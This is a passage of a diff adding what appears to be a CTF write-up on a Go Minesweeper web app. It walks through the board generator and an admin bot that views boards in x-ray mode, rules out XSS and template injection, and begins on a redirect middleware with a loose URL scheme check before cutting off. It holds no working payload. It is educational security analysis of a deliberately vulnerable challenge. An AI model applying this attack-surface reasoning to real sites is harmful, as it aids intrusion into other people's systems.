+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>      </span><span style="color:#c594c5;">if </span><span>count </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">6 </span><span style="color:#5fb3b3;">|| ((</span><span>y </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">|| </span><span>y </span><span style="color:#5fb3b3;">== (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) || </span><span>x </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">|| </span><span>x </span><span style="color:#5fb3b3;">== (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)) &amp;&amp; </span><span>count </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">3 </span><span style="color:#5fb3b3;">|| ((</span><span>x </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">|| </span><span>x </span><span style="color:#5fb3b3;">== (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)) &amp;&amp; (</span><span>y </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">|| </span><span>y </span><span style="color:#5fb3b3;">== (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">))) &amp;&amp; </span><span>count </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">2</span><span style="color:#5fb3b3;">) {
+</span><span>        </span><span style="color:#5f6364;">// fmt.Println(&quot;Count: &quot;, count)
+</span><span>        </span><span style="color:#5f6364;">// fmt.Println(&quot;Pos: &quot;, i)
+</span><span>        board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">] = </span><span style="color:#f99157;">100
+</span><span>        changed </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">true
+</span><span>        </span><span style="color:#c594c5;">break
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>      board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">] = </span><span>count
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  bombs </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">0
+</span><span>  </span><span style="color:#c594c5;">for </span><span>i </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">; </span><span>i </span><span style="color:#5fb3b3;">&lt; </span><span>DIM</span><span style="color:#5fb3b3;">*</span><span>DIM</span><span style="color:#5fb3b3;">; </span><span>i</span><span style="color:#5fb3b3;">++ {
+</span><span>    </span><span style="color:#c594c5;">if </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>      bombs</span><span style="color:#5fb3b3;">++
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  </span><span style="color:#5f6364;">// log.Printf(&quot;Generated board with %d%% bombs&quot;, bombs*100/(DIM*DIM))
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">return </span><span>board
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+</details>
+<p>This results in the following game mechanics:</p>
+<ul>
+<li>Bombs make up 50%-60% of the board;</li>
+<li>The center of the board is nearly always a bomb;</li>
+<li>There is usually a “safe” side, where the bombs don’t spread to;</li>
+<li>All the bombs are connected to each other, which means there are no bombs
+isolated from the rest of the bombs (this helps decisions on 50/50 situations
+where one option could have never been generated by this function);</li>
+<li>There can, however, still exist safe spots isolated from each other.</li>
+</ul>
+<p>These mechanics will be important in the future, so keep them in mind.</p>
+<figure><a href=".&#x2F;xray-view.png" class="img-fullscreen-link" target="_blank">
+    <img
+      src=".&#x2F;xray-view.png"
+      srcset="https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.dd89e831cc76ab6f.webp 1000w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.1c444db5b841aa03.webp 900w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.667f66b1ca98010f.webp 800w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.d82ce00e6dd2b965.webp 700w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.75ad55f01cf60bbb.webp 600w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.952ee83361ed6b46.webp 500w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.cf0e42dec00760a6.webp 400w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.209b36c01c7a18d8.webp 300w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.97ee76e05bc42c52.webp 200w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.f6ec10c88b2f1132.webp 100w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;xray-view.1dbca3a892643274.webp 1054w"
+      alt="Admin X-ray view, where it is possible to see the board without solving it"
+      width="1054"
+      loading="lazy"
+      decoding="async"
+    />
+  </a><figcaption>Admin X-ray view, where it is possible to see the board without solving it</figcaption></figure>
+<p>Finally, before delving into the exploitation of this app, let’s take a look
+at what the “Admin check” button does.
+When clicked, it creates a new admin account and invokes a headless Chromium
+browser that performs the following actions:</p>
+<ol>
+<li>Login as the admin</li>
+<li>Sleep for 1 second</li>
+<li>Clone the board of the user</li>
+<li>Sleep for 1 second</li>
+<li>Open the board of the user with the <code>xray</code> option (shows where the bombs are)</li>
+<li>Sleep for 4 seconds</li>
+</ol>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">func </span><span style="color:#6699cc;">checkBoardHandler</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">w </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">ResponseWriter</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">r </span><span style="color:#5fb3b3;">*</span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Request</span><span style="color:#5fb3b3;">) {
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span>  data </span><span style="color:#5fb3b3;">:= </span><span style="color:#c594c5;">struct </span><span style="color:#5fb3b3;">{
+</span><span>    Actions </span><span style="color:#5fb3b3;">[]</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{} `</span><span style="color:#99c794;">json:&quot;actions&quot;</span><span style="color:#5fb3b3;">`
+</span><span>    Browser </span><span style="color:#fac863;">string        </span><span style="color:#5fb3b3;">`</span><span style="color:#99c794;">json:&quot;browser&quot;</span><span style="color:#5fb3b3;">`
+</span><span>  </span><span style="color:#5fb3b3;">}{
+</span><span>    Actions</span><span style="color:#5fb3b3;">: []</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{}{
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">request</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">url</span><span style="color:#5fb3b3;">&quot;:  </span><span>CHALL_URL </span><span style="color:#5fb3b3;">+ &quot;</span><span style="color:#99c794;">/login</span><span style="color:#5fb3b3;">&quot;,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;:    &quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">element</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">#userid</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">value</span><span style="color:#5fb3b3;">&quot;:   </span><span>botUserId</span><span style="color:#5fb3b3;">,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;:    &quot;</span><span style="color:#99c794;">click</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">element</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">#submitbtn</span><span style="color:#5fb3b3;">&quot;,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{}{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">sleep</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">time</span><span style="color:#5fb3b3;">&quot;: </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">request</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">url</span><span style="color:#5fb3b3;">&quot;:  </span><span>CHALL_URL </span><span style="color:#5fb3b3;">+ &quot;</span><span style="color:#99c794;">/clone?cloneid=</span><span style="color:#5fb3b3;">&quot; + </span><span>cloneid</span><span style="color:#5fb3b3;">,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{}{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">sleep</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">time</span><span style="color:#5fb3b3;">&quot;: </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">request</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">url</span><span style="color:#5fb3b3;">&quot;:  </span><span>CHALL_URL </span><span style="color:#5fb3b3;">+ &quot;</span><span style="color:#99c794;">/board?xray=1</span><span style="color:#5fb3b3;">&quot;,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{}{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">sleep</span><span style="color:#5fb3b3;">&quot;,
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">time</span><span style="color:#5fb3b3;">&quot;: </span><span style="color:#f99157;">4</span><span style="color:#5fb3b3;">,
+</span><span>      </span><span style="color:#5fb3b3;">},
+</span><span>    </span><span style="color:#5fb3b3;">},
+</span><span>    Browser</span><span style="color:#5fb3b3;">: &quot;</span><span style="color:#99c794;">chrome</span><span style="color:#5fb3b3;">&quot;,
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Additionally, further inspection of the clone endpoint reveals that each board
+can only be cloned up to 5 times, which is reset when a new game is started.</p>
+<p>This gives us a very strong hint that we must somehow take advantage of the bot
+to extract information about our own game.</p>
+<h2 id="investigating-attack-vectors">Investigating Attack Vectors</h2>
+<p>Now that we have an overview of the challenge, we need to figure out which
+attack vectors exist.</p>
+<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+<p>Scrolling through the code, the first thing that catches my attention is this
+middleware setting certain security headers.
+Interestingly, the <a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP header</a> seems to be commented out, so I thought there
+might be some kind of XSS that we have to exploit.</p>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">func </span><span style="color:#6699cc;">securityHeadersMiddleware</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">next </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Handler</span><span style="color:#5fb3b3;">) </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Handler </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#c594c5;">return </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">HandlerFunc</span><span style="color:#5fb3b3;">(</span><span style="color:#c594c5;">func</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">w </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">ResponseWriter</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">r </span><span style="color:#5fb3b3;">*</span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Request</span><span style="color:#5fb3b3;">) {
+</span><span>    </span><span style="color:#5f6364;">// Set security headers
+</span><span>    </span><span style="color:#5f6364;">// https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">X-Frame-Options</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">DENY</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">X-XSS-Protection</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">0</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">X-Content-Type-Options</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">nosniff</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Referrer-Policy</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">strict-origin-when-cross-origin</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Content-Type</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">text/html; charset=UTF-8</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Strict-Transport-Security</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">max-age=63072000; includeSubDomains; preload</span><span style="color:#5fb3b3;">&quot;)
+</span><mark style="background-color:#3e4044;"><span>    </span><span style="color:#5f6364;">// I have some inline scripts in the templates, who cares about CSP anyway
+</span></mark><mark style="background-color:#3e4044;"><span>    </span><span style="color:#5f6364;">// w.Header().Set(&quot;Content-Security-Policy&quot;, &quot;script-src &#39;self&#39;;&quot;)
+</span></mark><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Cross-Origin-Opener-Policy</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">same-origin</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Cross-Origin-Embedder-Policy</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">require-corp</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Cross-Origin-Resource-Policy</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">same-site</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    w</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Header</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Set</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Permissions-Policy</span><span style="color:#5fb3b3;">&quot;, &quot;</span><span style="color:#99c794;">geolocation=(), camera=(), microphone=()</span><span style="color:#5fb3b3;">&quot;)
+</span><span>
+</span><span>    next</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">ServeHTTP</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, </span><span>r</span><span style="color:#5fb3b3;">)
+</span><span>  </span><span style="color:#5fb3b3;">})
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>However, it seems like the challenge author was just lazy (or wanted to throw us off),
+because looking through the HTML templates did not show anything promising.
+There doesn’t seem to be any variable that we control; the only data we can directly change
+is the board itself, which is encoded as an integer array, meaning there is no way to
+inject a string there.</p>
+<h3 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</h3>
+<p>Since there were HTML templates involved, I then looked into the function that handles
+their rendering, hoping to find a vulnerability there.
+While it seemed secure at first glance, as I am not very experienced with Go I looked
+up SSTI examples in Go to make sure it was sound.</p>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">func </span><span style="color:#6699cc;">renderTemplate</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">w </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">ResponseWriter</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">templateFile </span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">data </span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{}) {
+</span><span>  </span><span style="color:#5f6364;">// Parse the template file
+</span><span>  tmpl</span><span style="color:#5fb3b3;">, </span><span>err </span><span style="color:#5fb3b3;">:= </span><span>template</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">New</span><span style="color:#5fb3b3;">(</span><span>templateFile</span><span style="color:#5fb3b3;">).</span><span style="color:#6699cc;">Funcs</span><span style="color:#5fb3b3;">(</span><span>template</span><span style="color:#5fb3b3;">.</span><span>FuncMap</span><span style="color:#5fb3b3;">{&quot;</span><span style="color:#99c794;">mod</span><span style="color:#5fb3b3;">&quot;: </span><span style="color:#c594c5;">func</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">i</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">j </span><span style="color:#fac863;">int</span><span style="color:#5fb3b3;">) </span><span style="color:#fac863;">int </span><span style="color:#5fb3b3;">{ </span><span style="color:#c594c5;">return </span><span>i </span><span style="color:#5fb3b3;">% </span><span>j </span><span style="color:#5fb3b3;">}}).</span><span style="color:#6699cc;">ParseFiles</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">templates/</span><span style="color:#5fb3b3;">&quot;+</span><span>templateFile</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">templates/header.html</span><span style="color:#5fb3b3;">&quot;)
+</span><span>  </span><span style="color:#c594c5;">if </span><span>err </span><span style="color:#5fb3b3;">!= </span><span style="color:#f99157;">nil </span><span style="color:#5fb3b3;">{
+</span><span>    log</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(</span><span>err</span><span style="color:#5fb3b3;">)
+</span><span>    http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">Internal Server Error</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusInternalServerError</span><span style="color:#5fb3b3;">)
+</span><span>    </span><span style="color:#c594c5;">return
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  </span><span style="color:#5f6364;">// Execute the template with the data
+</span><span>  err </span><span style="color:#5fb3b3;">= </span><span>tmpl</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Execute</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, </span><span>data</span><span style="color:#5fb3b3;">)
+</span><span>  </span><span style="color:#c594c5;">if </span><span>err </span><span style="color:#5fb3b3;">!= </span><span style="color:#f99157;">nil </span><span style="color:#5fb3b3;">{
+</span><span>    log</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(</span><span>err</span><span style="color:#5fb3b3;">)
+</span><span>    http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">Internal Server Error</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusInternalServerError</span><span style="color:#5fb3b3;">)
+</span><span>    </span><span style="color:#c594c5;">return
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Similarly to XSS, there doesn’t seem to be anything exploitable here, since we don’t
+control the <code>templateFile</code> variable.</p>
+<h3 id="redirect-middleware">Redirect Middleware</h3>
+<p>However, one middleware caught my attention, since it handles user input.
+This middleware is responsible for redirecting the user, upon login, to the link
+pointed by the <code>redirect</code> query parameter.
+This means that the URL <code>https://gosweeper.example?redirect=/board</code> would redirect
+any logged in user to <code>/board</code>.</p>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">func </span><span style="color:#6699cc;">redirectMiddleware</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">next </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Handler</span><span style="color:#5fb3b3;">) </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Handler </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#c594c5;">return </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">HandlerFunc</span><span style="color:#5fb3b3;">(</span><span style="color:#c594c5;">func</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">w </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">ResponseWriter</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">r </span><span style="color:#5fb3b3;">*</span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Request</span><span style="color:#5fb3b3;">) {
+</span><span>    urlto </span><span style="color:#5fb3b3;">:= </span><span>r</span><span style="color:#5fb3b3;">.</span><span>URL</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Query</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">Get</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">redirect</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    </span><span style="color:#c594c5;">if </span><span>urlto </span><span style="color:#5fb3b3;">!= &quot;&quot; {
+</span><span>      </span><span style="color:#5f6364;">// check if the user is authenticated
+</span><span>      </span><span style="color:#5f6364;">// ...
+</span><span>
+</span><span>      a</span><span style="color:#5fb3b3;">, </span><span>err </span><span style="color:#5fb3b3;">:= </span><span>url</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Parse</span><span style="color:#5fb3b3;">(</span><span>urlto</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>      </span><span style="color:#c594c5;">if </span><span>err </span><span style="color:#5fb3b3;">== </span><span style="color:#f99157;">nil </span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5f6364;">// accept only http and https or relative url
+</span><mark style="background-color:#3e4044;"><span>        </span><span style="color:#c594c5;">if </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Scheme </span><span style="color:#5fb3b3;">!= &quot;&quot; &amp;&amp; </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Scheme </span><span style="color:#5fb3b3;">!= &quot;</span><span style="color:#99c794;">http</span><span style="color:#5fb3b3;">&quot; &amp;&amp; </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Scheme </span><span style="color:#5fb3b3;">!= &quot;</span><span style="color:#99c794;">https</span><span style="color:#5fb3b3;">&quot; {
+</span></mark><span>          http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">URL parameter is invalid</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusBadRequest</span><span style="color:#5fb3b3;">)
+</span><span>          </span><span style="color:#c594c5;">return
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>        fmt</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Scheme: </span><span style="color:#5fb3b3;">&quot;, </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Scheme</span><span style="color:#5fb3b3;">)
+</span><span>        fmt</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">Host: </span><span style="color:#5fb3b3;">&quot;, </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Host</span><span style="color:#5fb3b3;">)
+</span><span>        fmt</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">HOST CHALL: </span><span style="color:#5fb3b3;">&quot;, </span><span>r</span><span style="color:#5fb3b3;">.</span><span>Host</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>        </span><span style="color:#5f6364;">// only accept same host
